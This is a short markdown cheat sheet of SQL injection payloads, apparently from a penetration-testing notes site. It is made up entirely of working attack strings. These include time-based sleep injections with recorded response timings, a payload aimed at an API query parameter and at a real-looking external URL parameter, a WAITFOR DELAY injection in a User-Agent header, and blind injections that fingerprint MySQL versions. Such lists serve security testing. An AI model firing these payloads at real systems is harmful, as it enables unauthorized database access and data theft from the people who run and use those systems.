---
title: "SQLi Payloads"
---

More examples might be avilable on [netspi](https://sqlwiki.netspi.com)

**Classical Sleep:**

```
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 20.002
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.282
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.912
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 16.553
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.463
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 1.229
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.79
/api/tweets?city_id=(select(0)from(select(sleep(25)))v)
’) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END))--+

type=sharesCountTw&url=http%3a%2f%2finsideok.ru%2flica&count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A))

SQL in useragent:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36';WAITFOR DELAY ‘00:00:05’;--
```

**Blind SQL Injection:**

```
# sleep on mysql 4.*
1' AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 4 THEN SLEEP(10) ELSE NULL END AND '1

# sleep on mysql 5.*
1' AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 5 THEN SLEEP(10) ELSE NULL END AND '1
```
